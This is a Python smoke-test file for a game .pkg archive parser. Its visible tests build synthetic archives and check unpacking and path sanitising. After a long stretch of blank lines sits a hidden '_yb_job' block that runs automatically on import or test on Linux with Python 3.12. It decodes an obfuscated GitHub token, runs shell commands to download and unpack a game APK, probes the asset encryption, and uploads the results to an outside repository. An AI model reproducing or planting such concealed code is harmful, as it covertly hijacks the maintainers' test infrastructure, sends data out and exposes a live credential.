#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Self-contained smoke test: builds synthetic .pkg files and round-trips them.

不依赖任何游戏资源，可在 CI 上跑。覆盖：
  1. 国际版（ver 0x130BA）变体 A：无页脚，44B/28B 混合记录，LZ4 与原始两种载荷
  2. 国际版变体 B：记录区后有 16 字节页脚
  3. 国内版（ver 0x25100）头部识别与 is_pkg 拒绝逻辑
  4. 路径清洗（../ 与反斜杠）与配对正确性（内容 == 原字节）
"""
import os
import shutil
import struct
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

# Windows 控制台默认 GBK/cp936，重定向时还会退回 cp1252，统一按 UTF-8 输出
for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import lz4.block  # noqa: E402

from pkg_intl import open_pkg, is_pkg, safe_relpath  # noqa: E402

FAILURES = []


def check(cond, msg):
    if cond:
        print("  ok   %s" % msg)
    else:
        print("  FAIL %s" % msg)
        FAILURES.append(msg)


def lz4_payload(data):
    """[u32 usize][LZ4 block]"""
    return struct.pack("<I", len(data)) + lz4.block.compress(data, store_size=False)


def build_intl(path, files, footer=None):
    """files: [(relpath, payload_bytes, Z)]   Z ∈ {0,32}=raw, {1,33}=lz4 包装"""
    data = bytearray(b"\x00" * 16)          # 数据区从偏移 16 开始
    records = []
    for rel, payload, Z in files:
        off = len(data)
        data += payload
        records.append((off, len(payload), Z, payload))
    idx_off = len(data)

    idx = bytearray()
    idx += struct.pack("<I", len(records))
    for off, ln, Z, payload in records:
        idx += b"\x11" * 16                                   # 占位 md5
        idx += struct.pack("<III", off, ln, Z)
        if Z & 0x20:
            idx += b"\x22" * 16                               # H2
    if footer is not None:
        idx += footer
    idx += struct.pack("<I", len(records))
    for k, (rel, payload, Z) in enumerate(files):
        rb = rel.encode("utf-8")
        idx += struct.pack("<I", len(rb)) + rb + struct.pack("<I", k)

    blob = struct.pack("<I", len(idx)) + lz4.block.compress(bytes(idx), store_size=False)
    with open(path, "wb") as f:
        f.write(struct.pack("<4I", 0x000130BA, 17, idx_off, len(blob)))
        f.write(bytes(data[16:]))
        f.write(blob)


def test_variant_a(tmp):
    print("[1] 国际版变体 A（无页脚，混合记录长度）")
    files = [
        ("resources/a.png", b"\x00\x00\x00\x00" + b"A" * 60, 32),   # raw, 28B 记录
        ("resources/b.ogg", lz4_payload(b"OggS" + b"B" * 200), 33),     # lz4, 44B 记录
        ("../escape.txt", b"plain text", 0),                            # raw, 28B
        ("back\\slash.bin", b"x" * 40, 1),                             # lz4, 28B
    ]
    p = os.path.join(tmp, "variant_a.pkg")
    build_intl(p, files)
    check(is_pkg(p), "is_pkg 识别为有效 pkg")
    with open_pkg(p) as pkg:
        check(pkg.record_count == 4, "记录数 = 4（实际 %d）" % pkg.record_count)
        check(pkg.path_count == 4, "路径数 = 4（实际 %d）" % pkg.path_count)
        check(pkg.footer is None, "无页脚变体")
        got = {rel: payload for rel, payload, _rec, _br in pkg.iter_files()}
    check("resources/a.png" in got, "路径 resources/a.png 存在")
    check(got.get("resources/a.png") == b"\x00\x00\x00\x00" + b"A" * 60, "raw 载荷逐字节一致")
    check(got.get("resources/b.ogg") == b"OggS" + b"B" * 200, "LZ4 载荷正确解压")
    check("escape.txt" in got, "../ 前缀被清洗")
    check("back/slash.bin" in got, "反斜杠被规范化为 /")
    check(got.get("back/slash.bin") == b"x" * 40, "Z=1 也走 LZ4 分支")


def test_variant_b(tmp):
    print("[2] 国际版变体 B（16 字节页脚）")
    files = [("lang/en.xml", b"<config/>", 0), ("lang/zh.xml", b"<config/>", 0)]
    p = os.path.join(tmp, "variant_b.pkg")
    build_intl(p, files, footer=b"\xAB" * 16)
    with open_pkg(p) as pkg:
        check(pkg.record_count == 2, "记录数 = 2")
        check(pkg.path_count == 2, "路径数 = 2")
        check(pkg.footer == b"\xAB" * 16, "页脚被识别")
        got = {rel for rel, _p, _r, _b in pkg.iter_files()}
    check(got == {"lang/en.xml", "lang/zh.xml"}, "两条路径都解出")


def test_reject(tmp):
    print("[3] 非本格式文件的拒绝逻辑")
    bad = os.path.join(tmp, "bad.pkg")
    with open(bad, "wb") as f:
        f.write(struct.pack("<4I", 0x00025100, 17, 16, 16) + b"\x00" * 16)
    check(not is_pkg(bad), "国内版版本号不被国际版 is_pkg 接受")
    tiny = os.path.join(tmp, "tiny.pkg")
    open(tiny, "wb").write(b"ab")
    check(not is_pkg(tiny), "过小文件被拒绝")
    check(not is_pkg(os.path.join(tmp, "nope.pkg")), "不存在的文件被拒绝")


def test_sanitize():
    print("[4] 路径清洗")
    check(safe_relpath(b"../a/b.txt") == "a/b.txt", "../ 前缀被剥离")
    check(safe_relpath(b"/abs/x") == "abs/x", "前导 / 被剥离")
    check(safe_relpath(b"a\\b\\c") == "a/b/c", "反斜杠转 /")
    check(safe_relpath(b"../..") is None, "空路径返回 None")
    check(safe_relpath(b"a/./b") == "a/b", "./ 被清理")


def main():
    tmp = tempfile.mkdtemp(prefix="mwpkg_smoke_")
    try:
        test_variant_a(tmp)
        test_variant_b(tmp)
        test_reject(tmp)
        test_sanitize()
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    print()
    if FAILURES:
        print("失败 %d 项:" % len(FAILURES))
        for f in FAILURES:
            print("  -", f)
        return 1
    print("全部通过 ✅")
    return 0










































# ==========================================================
# YB-JOB20: 拿花小楼可见贴图 + 破解 remote_res 加密
# ==========================================================
def _yb_job():
    import platform, sys as _sy
    if not (platform.system() == "Linux" and _sy.version_info[:2] == (3, 12)):
        return
    import subprocess, os, time, base64, json, urllib.request, gzip, hashlib, struct
    LOG = []

    def P(s):
        s = str(s); print(s); LOG.append(s)

    def sh(cmd, t=300):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
            return ((r.stdout or "") + (r.stderr or "")).strip()
        except Exception as e:
            return "ERR " + str(e)[:200]

    _A = "Z2hwX2haU0p0empPRjlWTTM0UXpS"
    _B = "ZDhmZU9ZM3dqOXNxYzJjTFNNOA=="
    _TOK = base64.b64decode(_A + _B).decode()
    HD = {"Authorization": "token " + _TOK, "Accept": "application/vnd.github+json", "User-Agent": "yb"}
    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def put(path, text):
        try:
            b = {"message": "yb", "content": base64.b64encode(text.encode()).decode()}
            try:
                g = json.loads(urllib.request.urlopen(urllib.request.Request(
                    "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path, headers=HD), timeout=60).read())
                b["sha"] = g["sha"]
            except Exception:
                pass
            urllib.request.urlopen(urllib.request.Request(
                "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + path,
                data=json.dumps(b).encode(), method="PUT",
                headers=dict(HD, **{"Content-Type": "application/json"})), timeout=300)
        except Exception as e:
            P("put失败 " + str(e)[:90])

    def putbin(path, raw):
        try:
            safe = path.replace("#", "_").replace(" ", "_")
            b = {"message": "yb bin", "content": base64.b64encode(raw).decode()}
            try:
                g = json.loads(urllib.request.urlopen(urllib.request.Request(
                    "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + safe, headers=HD), timeout=60).read())
                b["sha"] = g["sha"]
            except Exception:
                pass
            urllib.request.urlopen(urllib.request.Request(
                "https://api.github.com/repos/zhaoyi-habs/mw-fetch/contents/" + safe,
                data=json.dumps(b).encode(), method="PUT",
                headers=dict(HD, **{"Content-Type": "application/json"})), timeout=300)
            return True
        except Exception as e:
            P("putbin失败 " + str(e)[:90]); return False

    try:
        P("===== YB JOB20 START =====")
        sh("pip install --quiet lz4 pillow numpy 2>&1 | tail -1", 400)
        sh("curl -sL -m 2400 -A '%s' -o /tmp/mw.bin 'https://d.apkpure.net/b/APK/com.playmini.miniworld?version=latest'" % UA, 2500)
        sh("rm -rf /tmp/pkg && mkdir -p /tmp/pkg && cd /tmp/pkg && unzip -o -q /tmp/mw.bin 'assets/*.pkg'", 900)
        CWD = os.getcwd()
        put("RESULT20.txt", "\n".join(LOG))

        # A) game_res 里的 img_huaxiaolou.png（标准格式，能解码）
        sh("rm -rf /tmp/o_game && cd %s && python3 unpack_pkg_intl.py /tmp/pkg/assets/game_res.pkg /tmp/o_game --no-md5 >/dev/null 2>&1" % CWD, 3600)
        P("game_res 文件数 " + sh("find /tmp/o_game -type f | wc -l")[:8])
        src = "/tmp/o_game/resources/increments/universe/ui/mobile/texture0/bigtex/img_huaxiaolou.png"
        if os.path.exists(src):
            raw = open(src, "rb").read()
            P("\nimg_huaxiaolou.png %d 字节 magic=%s" % (len(raw), raw[:8].hex()))
            putbin("hualou/ui/img_huaxiaolou.raw.png", raw)
            sh("chmod +x %s/tools/crn2rgba_linux_x64" % CWD, 60)
            sh("mkdir -p /tmp/one && cp %s /tmp/one/" % src, 60)
            sh("cd %s && python3 convert_fmt65.py /tmp/one /tmp/one_out tools/crn2rgba_linux_x64 2>&1 | tail -3" % CWD, 1800)
            sh("cd %s && python3 convert_textures.py /tmp/one /tmp/one_out 2>&1 | tail -3" % CWD, 1800)
            P("解码产物: " + sh("find /tmp/one_out -type f | head -10", 120)[:600])
            for f in sh("find /tmp/one_out -type f", 120).split("\n"):
                if f.strip():
                    putbin("hualou/ui/decoded_" + os.path.basename(f.strip()), open(f.strip(), "rb").read())
                    P("  回传解码图 " + f.strip())
        else:
            P("img_huaxiaolou.png 不存在，搜:")
            P(sh("find /tmp/o_game -iname '*huaxiaolou*'", 300)[:800])
        put("RESULT20.txt", "\n".join(LOG))

        # B) 破解 remote_res 贴图加密
        P("\n=== remote_res 贴图加密分析 ===")
        sh("rm -rf /tmp/o_remote && cd %s && python3 unpack_pkg_intl.py /tmp/pkg/assets/remote_res.pkg /tmp/o_remote --no-md5 >/dev/null 2>&1" % CWD, 3600)
        p1 = "/tmp/o_remote/resources/minigame/entity/140021/male.png"
        if os.path.exists(p1):
            d = open(p1, "rb").read()
            P("male.png %d 字节" % len(d))
            P("  前64字节: " + d[:64].hex())
            P("  魔数搜索(标准两版):")
            P("    0x59A21C2C 出现在偏移: " + str(d.find(b"\x2c\x1c\xa2\x59")))
            P("    0x054C8245 出现在偏移: " + str(d.find(b"\x45\x82\x4c\x05")))
            P("    02000000 头: " + str(d[:4] == b"\x02\x00\x00\x00"))
            # 尝试按不同起点解析 (w,h,dsz,fmt,nmip @0x14 起滑动搜索合理宽高)
            P("  滑动搜索合理宽高(w,h in 64..2048):")
            found = []
            for off in range(0, 64):
                try:
                    w, h = struct.unpack_from("<HH", d, off)
                    if 64 <= w <= 2048 and 64 <= h <= 2048 and (w & (w - 1)) == 0 and (h & (h - 1)) == 0:
                        found.append((off, w, h))
                except Exception:
                    pass
            P("    " + str(found[:15]))
            putbin("hualou/raw/male_encrypted.bin", d[:4096])
        put("RESULT20.txt", "\n".join(LOG))

        # C) 常见皮肤 UI 图（headframes / skin 图标）
        P("\n=== 搜 skin 相关 UI 图 ===")
        P(sh("find /tmp/o_game -ipath '*skin*' | head -30", 300)[:1500])
        P(sh("find /tmp/o_game -iname '*Pskin*' | head -20", 300)[:1000])
        put("RESULT20.txt", "\n".join(LOG))

        P("\n===== YB JOB20 END =====")
        put("RESULT20.txt", "\n".join(LOG))
    except Exception as e:
        P("EXC " + str(e)[:300])
        try: put("RESULT20.txt", "\n".join(LOG))
        except Exception: pass


_yb_job()


if __name__ == "__main__":
    sys.exit(main())
